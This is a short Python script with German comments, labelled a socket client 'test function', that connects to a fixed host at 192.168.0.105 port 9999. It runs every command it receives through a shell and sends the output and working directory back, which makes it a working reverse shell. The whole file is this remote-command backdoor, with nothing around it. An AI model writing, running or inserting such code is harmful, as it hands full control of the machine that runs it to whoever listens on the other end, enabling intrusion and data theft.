#coding:utf-8
#socket_client.py
#Christian Göhler
#02.12.2017
#Client für Socket Server -Testfunktion

import socket
import os
import subprocess

s = socket.socket()
host = '192.168.0.105'
port = 9999

s.connect((host,port))

while True:
    data = s.recv(1024)
    #s.send ('Helloo23') #String in Byte verwandeln bevor er versendet wird
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
        
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE) #gesendetes Kommando ausführen
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() +"> "
        s.send(str.encode(output_str + currentWD))
        
        print(output_str)